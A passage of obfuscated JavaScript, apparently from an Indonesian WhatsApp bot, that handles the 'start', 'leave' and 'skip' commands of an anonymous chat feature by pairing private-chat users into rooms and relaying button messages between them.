room=Object[_0x2b5443(0x56b,0x53f,0x611,0x562)](this[_0x2b5443(0x3b7,0x3b5,0x486,0x483)])[_0x5c83b7(0x3b5,0x2ab,0x34c,0x314)](_0x4dc6da=>_0x4dc6da[_0x5c83b7(0x3f7,0x3da,0x3f5,0x42a)](m[_0x2b5443(0x49c,0x4b5,0x512,0x46c)]));if(!room){const _0x4db05a={};_0x4db05a['displayTex'+'t']=_0x5c83b7(0x3c1,0x39e,0x3c1,0x3f2);const _0x2a3d07={};_0x2a3d07[_0x5c83b7(0x291,0x314,0x2b3,0x344)]=_0x5c83b7(0x41c,0x33c,0x369,0x31e),_0x2a3d07['buttonText']=_0x4db05a,_0x2a3d07[_0x5c83b7(0x313,0x309,0x31d,0x3b4)]=0x1;const _0x4c54f2={};_0x4c54f2[_0x2b5443(0x4cf,0x429,0x402,0x3ed)]=mek,await sendButMessage(from,_0x5c83b7(0x306,0x37e,0x325,0x287)+_0x2b5443(0x3b3,0x3f4,0x46d,0x398)+_0x5c83b7(0x354,0x3c2,0x38c,0x385)+_0x5c83b7(0x49b,0x367,0x3ec,0x3e0)+_0x2b5443(0x583,0x511,0x5e4,0x4f9)+'Untuk\x20Star'+_0x2b5443(0x408,0x3d2,0x35b,0x3dc)+_0x5c83b7(0x32a,0x365,0x30f,0x255),'©\x20Copyrigh'+'t\x20'+botname+_0x2b5443(0x532,0x4e2,0x527,0x554),[_0x2a3d07],_0x4c54f2);throw![];}const _0x47a01f={};_0x47a01f[_0x5c83b7(0x405,0x476,0x3c8,0x3d5)+'t']=_0x5c83b7(0x3fb,0x38d,0x3c1,0x448);const _0x3c7782={};_0x3c7782[_0x5c83b7(0x22e,0x33a,0x2b3,0x358)]='start',_0x3c7782['buttonText']=_0x47a01f,_0x3c7782[_0x2b5443(0x4f2,0x423,0x3d0,0x365)]=0x1;const _0x2bb265={};_0x2bb265[_0x5c83b7(0x3e6,0x3a2,0x323,0x3a7)]=mek,sendButMessage(from,_0x2b5443(0x469,0x524,0x4d2,0x46d)+_0x5c83b7(0x3fb,0x396,0x44b,0x45f)+_0x5c83b7(0x4f0,0x50a,0x436,0x398)+_0x5c83b7(0x446,0x481,0x447,0x39a)+_0x2b5443(0x4ae,0x3f7,0x3fc,0x3c6),_0x2b5443(0x2ff,0x3bd,0x300,0x38f)+'t\x20'+botname+'\x202021',[_0x3c7782],_0x2bb265);let other=room[_0x5c83b7(0x38d,0x3ae,0x3eb,0x3ca)](m[_0x2b5443(0x3e6,0x4b5,0x582,0x524)]);const _0x1f68ed={};_0x1f68ed[_0x5c83b7(0x45a,0x301,0x3c8,0x455)+'t']=_0x5c83b7(0x2f1,0x2fa,0x3c1,0x2f1);const _0x391df2={};_0x391df2[_0x5c83b7(0x1db,0x2dc,0x2b3,0x331)]=_0x2b5443(0x549,0x46f,0x4e3,0x4f2),_0x391df2[_0x2b5443(0x386,0x43c,0x3c5,0x511)]=_0x1f68ed,_0x391df2[_0x5c83b7(0x3b4,0x260,0x31d,0x34f)]=0x1;const _0x201591={};_0x201591[_0x5c83b7(0x2aa,0x30b,0x323,0x2d3)]=mek;if(other)await sendButMessage(other,_0x5c83b7(0x426,0x314,0x3cd,0x33a)+_0x5c83b7(0x2b2,0x2eb,0x380,0x2b1)+_0x5c83b7(0x252,0x282,0x2ef,0x3a1),'©\x20Copyrigh'+'t\x20'+botname+_0x5c83b7(0x3d9,0x31a,0x3dc,0x435),[_0x391df2],_0x201591);delete this['anonymous'][room['id']];if(command===_0x5c83b7(0x3d1,0x44e,0x391,0x38b))break;}case _0x2b5443(0x37b,0x451,0x3ab,0x3c2):case'start':{if(isGroup)return reply(_0x2b5443(0x4c1,0x4c4,0x4a9,0x418)+'te\x20chat');this['anonymous']=this[_0x5c83b7(0x354,0x2e3,0x2af,0x2f3)]?this[_0x2b5443(0x38b,0x3b5,0x323,0x32e)]:{};if(Object[_0x2b5443(0x4f0,0x53f,0x5de,0x567)](this[_0x2b5443(0x301,0x3b5,0x43a,0x43d)])[_0x5c83b7(0x400,0x390,0x34c,0x39b)](_0x193d06=>_0x193d06[_0x2b5443(0x4e9,0x4fb,0x45c,0x465)](m[_0x5c83b7(0x30f,0x2e3,0x3af,0x3fa)]))){const _0x34d6e0={};_0x34d6e0[_0x5c83b7(0x329,0x3ce,0x3c8,0x3fe)+'t']=_0x5c83b7(0x32f,0x427,0x3a2,0x46c);const _0x53b19a={};_0x53b19a['buttonId']='leave',_0x53b19a[_0x5c83b7(0x33f,0x2f8,0x336,0x270)]=_0x34d6e0,_0x53b19a[_0x5c83b7(0x300,0x283,0x31d,0x324)]=0x1;const _0x437ebf={};_0x437ebf[_0x2b5443(0x486,0x429,0x455,0x3c6)]=mek,await sendButMessage(from,_0x5c83b7(0x298,0x272,0x31f,0x2d1)+_0x5c83b7(0x3ab,0x22d,0x2ee,0x3ac)+_0x2b5443(0x4a3,0x492,0x4f3,0x4db)+_0x2b5443(0x4a9,0x4fd,0x482,0x42f),_0x5c83b7(0x333,0x324,0x2b7,0x2e3)+'t\x20'+botname+'\x202021',[_0x53b19a],_0x437ebf);throw![];}let room=Object[_0x5c83b7(0x383,0x404,0x439,0x49b)](this[_0x5c83b7(0x241,0x35e,0x2af,0x203)])[_0x5c83b7(0x2cc,0x40a,0x34c,0x34a)](_0x13c1f5=>_0x13c1f5[_0x5c83b7(0x423,0x397,0x42e,0x48f)]==='WAITING'&&!_0x13c1f5['check'](m['sender']));if(room){const _0x2aa13c={};_0x2aa13c[_0x2b5443(0x471,0x4ce,0x51d,0x48a)+'t']=_0x2b5443(0x54a,0x4a8,0x513,0x415);const _0x1bbdea={};_0x1bbdea[_0x5c83b7(0x366,0x325,0x2b3,0x277)]=_0x5c83b7(0x35d,0x462,0x391,0x3b5),_0x1bbdea[_0x5c83b7(0x2a7,0x3d0,0x336,0x38e)]=_0x2aa13c,_0x1bbdea[_0x2b5443(0x3a2,0x423,0x38c,0x4b6)]=0x1;const _0x170cfc={};_0x170cfc[_0x5c83b7(0x408,0x3be,0x3c8,0x41a)+'t']=_0x2b5443(0x437,0x45e,0x505,0x4e6);const _0x357a47={};_0x357a47[_0x5c83b7(0x38e,0x2f7,0x2b3,0x297)]=_0x2b5443(0x5e3,0x540,0x4e0,0x5e7),_0x357a47['buttonText']=_0x170cfc,_0x357a47[_0x2b5443(0x37f,0x423,0x485,0x3cc)]=0x1;const _0x21b2d5={};_0x21b2d5[_0x2b5443(0x470,0x429,0x3d6,0x3a4)]=mek,await sendButMessage(room['a'],_0x2b5443(0x4a6,0x401,0x3ad,0x449)+_0x2b5443(0x4a3,0x4a7,0x444,0x477)+'🎭',_0x5c83b7(0x260,0x2b0,0x2b7,0x2a3)+'t\x20'+botname+'\x202021',[_0x1bbdea,_0x357a47],_0x21b2d5),room['b']=m['sender'],room[_0x2b5443(0x4d8,0x534,0x475,0x4fd)]=_0x2b5443(0x373,0x3f9,0x369,0x3ed);const _0x3f0676={};_0x3f0676['displayTex'+'t']='LEAVE';const _0x5a79a4={};_0x5a79a4['buttonId']='leave',_0x5a79a4['buttonText']=_0x3f0676,_0x5a79a4[_0x5c83b7(0x3bf,0x3cd,0x31d,0x2de)]=0x1;const _0x58f580={};_0x58f580[_0x5c83b7(0x44f,0x465,0x3c8,0x411)+'t']=_0x5c83b7(0x29e,0x2c9,0x358,0x32f);const _0x5a7e10={};_0x5a7e10['buttonId']=_0x2b5443(0x489,0x540,0x4d3,0x567),_0x5a7e10[_0x2b5443(0x457,0x43c,0x3f9,0x46c)]=_0x58f580,_0x5a7e10[_0x2b5443(0x46c,0x423,0x37d,0x3ef)]=0x1;const _0x3287c3={};_0x3287c3['quoted']=mek,await sendButMessage(room['b'],_0x2b5443(0x41d,0x401,0x35d,0x4bf)+_0x5c83b7(0x365,0x3e7,0x3a1,0x2f8)+'🎭',_0x5c83b7(0x372,0x368,0x2b7,0x377)+'t\x20'+botname+_0x2b5443(0x49d,0x4e2,0x423,0x490),[_0x5a79a4,_0x5a7e10],_0x3287c3);}else{let id=+new Date();this['anonymous'][id]={'id':id,'a':m[_0x2b5443(0x57c,0x4b5,0x4c0,0x43c)],'b':'','state':_0x2b5443(0x46a,0x403,0x3e0,0x331),'check':function(_0x3669f0=''){function _0x537797(_0x2fccfa,_0x206971,_0x56df69,_0x4a90f5){return _0x5c83b7(_0x2fccfa-0x169,_0x206971-0x182,_0x56df69- -0x86,_0x4a90f5);}return[this['a'],this['b']][_0x537797(0x2b1,0x361,0x346,0x2e5)](_0x3669f0);},'other':function(_0x399dc5=''){const _0x40f3a0={};function _0x19295d(_0x1917cd,_0x4082b5,_0x563237,_0x2e9653){return _0x2b5443(_0x1917cd-0x152,_0x1917cd- -0x421,_0x563237-0x10d,_0x4082b5);}_0x40f3a0['nayoL']=function(_0x48a5a6,_0x3140ce){return _0x48a5a6===_0x3140ce;};const _0x8e9ce1=_0x40f3a0;return _0x399dc5===this['a']?this['b']:_0x8e9ce1[_0x19295d(0x120,0xf6,0x1ad,0xae)](_0x399dc5,this['b'])?this['a']:'';}};const _0x421a2c={};_0x421a2c[_0x5c83b7(0x3be,0x3e1,0x3c8,0x39c)+'t']=_0x2b5443(0x4e1,0x4a8,0x519,0x56d);const _0x622e98={};_0x622e98['buttonId']=_0x5c83b7(0x403,0x38f,0x391,0x2d0),_0x622e98[_0x2b5443(0x4d3,0x43c,0x39c,0x443)]=_0x421a2c,_0x622e98[_0x2b5443(0x447,0x423,0x39f,0x3a0)]=0x1;const _0x279c4e={};_0x279c4e[_0x5c83b7(0x3fb,0x2fd,0x323,0x2a2)]=mek,await sendButMessage(m['chat'],_0x5c83b7(0x3e8,0x2b6,0x36a,0x401)+'u\x20Partner_',_0x5c83b7(0x330,0x1ec,0x2b7,0x245)+'t\x20'+botname+'\x202021',[_0x622e98],_0x279c4e);}break;}case _0x2b5443(0x3bf,0x3c8,0x45b,0x388):case _0x2b5443(0x4aa,0x540,0x486,0x50d):case _0x2b5443(0x3a4,0x44a,0x45d,0x4f8):{if(isGroup)return reply(_0x2b5443(0x3af,0x438,0x3de,0x404)+_0x2b5443(0x42d,0x4d5,0x59f,0x4bb)+_0x5c83b7(0x3a8,0x319,0x2de,0x2a5)+_0x2b5443(0x47b,0x471,0x4d0,0x533));this['anonymous']=this['anonymous']?this['anonymous']:{};let romeo=Object['values'](this['anonymous'])[_0x2b5443(0x4bf,0x452,0x440,0x39a)](_0x3f600d=>_0x3f600d[_0x5c83b7(0x32d,0x364,0x3f5,0x39f)](m['sender']));if(!romeo){const _0x239025={};_0x239025[_0x5c83b7(0x32a,0x41b,0x3c8,0x40e)+'t']='START';const _0x4766f2={};_0x4766f2[_0x2b5443(0x324,0x3b9,0x32e,0x477)]='start',_0x4766f2[_0x2b5443(0x39d,0x43c,0x46a,0x369)]=_0x239025,_0x4766f2['type']=0x1;const _0x3f187d={};_0x3f187d['quoted']=mek,await sendButMessage(from,_0x2b5443(0x4b3,0x42b,0x486,0x3e0)+_0x5c83b7(0x370,0x260,0x2ee,0x32f)+_0x5c83b7(0x3f6,0x3a7,0x38c,0x326)+_0x2b5443(0x507,0x4f2,0x549,0x490)+_0x2b5443(0x50c,0x511,0x453,0x57a)+_0x5c83b7(0x3df,0x2d0,0x35f,0x30b)+_0x2b5443(0x416,0x3d2,0x3a0,0x306)+_0x5c83b7(0x3cd,0x338,0x30f,0x3bb),_0x2b5443(0x397,0x3bd,0x32d,0x46c)+'t\x20'+botname+_0x2b5443(0x53e,0x4e2,0x509,0x4c8),[_0x4766f2],_0x3f187d);throw![];}let other=romeo[_0x2b5443(0x537,0x4f1,0x47e,0x445)](m[_0x5c83b7(0x402,0x454,0x3af,0x414)]);const _0x494e55={};_0x494e55[_0x5c83b7(0x328,0x332,0x3c8,0x487)+'t']=_0x5c83b7(0x40b,0x30b,0x3c1,0x44f);const _0x3e5eba={};_0x3e5eba['buttonId']=_0x2b5443(0x513,0x46f,0x43e,0x3c7),_0x3e5eba[_0x2b5443(0x376,0x43c,0x42f,0x374)]=_0x494e55,_0x3e5eba[_0x2b5443(0x494,0x423,0x3c1,0x3cb)]=0x1;const _0x14ad8c={};_0x14ad8c[_0x2b5443(0x3aa,0x429,0x465,0x48d)]=mek;if(other)sendButMessage(other,_0x5c83b7(0x377,0x369,0x3cd,0x432)+_0x2b5443(0x4bc,0x486,0x4a7,0x3e3)+'kan\x20chat_',_0x5c83b7(0x334,0x37d,0x2b7,0x206)+_0x5c83b7(0x247,0x27f,0x306,0x35e)+botname+_0x2b5443(0x51f,0x4e2,0x485,0x46b),[_0x3e5eba],_0x14ad8c);delete this[_0x5c83b7(0x2e2,0x262,0x2af,0x246)][romeo['id']];let room=Object[_0x5c83b7(0x395,0x46b,0x439,0x40b)](this[_0x2b5443(0x437,0x3b5,0x2da,0x36b)])[_0x2b5443(0x3f3,0x452,0x3b9,0x494)](_0x46a472=>_0x46a472['state']===_0x5c83b7(0x299,0x2ee,0x2fd,0x32f)&&!_0x46a472[_0x5c83b7(0x454,0x4b3,0x3f5,0x498)](m[_0x2b5443(0x4bc,0x4b5,0x4fd,0x4a7)]));if(room){const _0x470600={};_0x470600['displayTex'+'t']=_0x2b5443(0x480,0x4a8,0x4e7,0x431);const _0x53ab6f={};_0x53ab6f['buttonId']=_0x5c83b7(0x308,0x3bf,0x391,0x2fd),_0x53ab6f[_0x5c83b7(0x2e4,0x293,0x336,0x2c4)]=_0x470600,_0x53ab6f[_0x2b5443(0x40c,0x423,0x380,0x4f1)]=0x1;const _0x1f6e09={};_0x1f6e09['displayTex'+'t']=_0x2b5443(0x3a6,0x45e,0x3eb,0x536);const _0x3b3856={};_0x3b3856[_0x5c83b7(0x26a,0x2af,0x2b3,0x25a)]=_0x5c83b7(0x4a9,0x467,0x43a,0x3d8),_0x3b3856[_0x2b5443(0x4c5,0x43c,0x45f,0x3ed)]=_0x1f6e09,_0x3b3856[_0x2b5443(0x3ff,0x423,0x480,0x3ad)]=0x1;const _0x1824ab={};_0x1824ab[_0x2b5443(0x46c,0x429,0x497,0x443)]=mek,await sendButMessage(room['a'],_0x2b5443(0x409,0x401,0x488,0x3d5)+'itemukan_\x20'+'🎭',_0x2b5443(0x2fc,0x3bd,0x314,0x40f)+'t\x20'+botname+_0x5c83b7(0x499,0x43c,0x3dc,0x379),[_0x53ab6f,_0x3b3856],_0x1824ab),room['b']=m[_0x5c83b7(0x389,0x458,0x3af,0x461)],room['state']=_0x2b5443(0x409,0x3f9,0x49f,0x48b);const _0x1d3f94={};_0x1d3f94[_0x2b5443(0x523,0x4ce,0x430,0x3f4)+'t']=_0x5c83b7(0x36c,0x34f,0x3a2,0x3e8);const _0x545b3e={};_0x545b3e[_0x2b5443(0x30a,0x3b9,0x321,0x325)]='leave',_0x545b3e[_0x5c83b7(0x341,0x2e9,0x336,0x2fb)]=_0x1d3f94,_0x545b3e[_0x2b5443(0x34f,0x423,0x3aa,0x4b0)]=0x1;const _0x5c7f9d={};_0x5c7f9d['displayTex'+'t']=_0x2b5443(0x3f4,0x45e,0x509,0x3bd);const _0x389590={};_0x389590[_0x5c83b7(0x327,0x1e6,0x2b3,0x352)]='skip',_0x389590['buttonText']=_0x5c7f9d,_0x389590['type']=0x1;const _0x3b5a99={};_0x3b5a99[_0x5c83b7(0x32d,0x3fc,0x323,0x376)]=mek,await sendButMessage(room['b'],_0x5c83b7(0x25a,0x3b7,0x2fb,0x336)+_0x2b5443(0x44f,0x4a7,0x498,0x565)+'🎭','©\x20Copyrigh'+'t\x20'+botname+'\x202021',[_0x545b3e,_0x389590],_0x3b5a99);}else{let id=+new Date();this['anonymous'][id]={'id':id,'a':m['sender'],'b':'','state':_0x2b5443(0x340,0x403,0x400,0x460),'check':function(_0x59b17a=''){return[this['a'],this['b']]['includes'](_0x59b17a);},'other':function(_0xf2cfdd=''){const _0x2b9a4f={};_0x2b9a4f[_0x421908(0x483,0x3ba,0x3ec,0x4a9)]=function(_0x28faeb,_0xdcc0f2){return _0x28faeb===_0xdcc0f2;};function _0x421908(_0x1de2b7,_0x421f7c,_0x4855ca,_0x228b31){return _0x5c83b7(_0x1de2b7-0x11a,_0x421f7c-0x4e,_0x1de2b7-0x126,_0x4855ca);}function _0x12909d(_0x3e5ae0,_0x485b56,_0x2f5c8e,_0x1e4d42){return _0x2b5443(_0x3e5ae0-0x161,_0x3e5ae0- -0x51d,_0x2f5c8e-0x31,_0x485b56);}const _0x14498d=_0x2b9a4f;return _0xf2cfdd===this['a']?this['b']:_0x14498d[_0x12909d(-0xba,-0xe7,-0x11f,-0xc0)](_0xf2cfdd,this['b'])?this['a']:'';}};const _0x254c05={};_0x254c05[_0x2b5443(0x598,0x4ce,0x49b,0x450)+'t']=_0x5c83b7(0x2f8,0x33c,0x3a2,0x39d);const _0x5ed1e8={};_0x5ed1e8[_0x5c83b7(0x1f5,0x240,0x2b3,0x292)]=_0x5c83b7(0x442,0x2e6,0x391,0x301),_0x5ed1e8[_0x5c83b7(0x3d0,0x31c,0x336,0x27e)]=_0x254c05,_0x5ed1e8['type']=0x1;const _0x60abb5={};_0x60abb5['quoted']=mek,await sendButMessage(m['chat'],'⏳\x20_Menungg'+_0x5c83b7(0x3cb,0x37e,0x3ca,0x459),_0x2b5443(0x3c5,0x3bd,0x431,0x36f)+'t\x20'+botname+_0x5c83b7(0x365,0x3fa,0x3dc,0x486),[_0x5ed1e8],_0x60abb5);}break;}}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), 'SELF-MODE', color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}
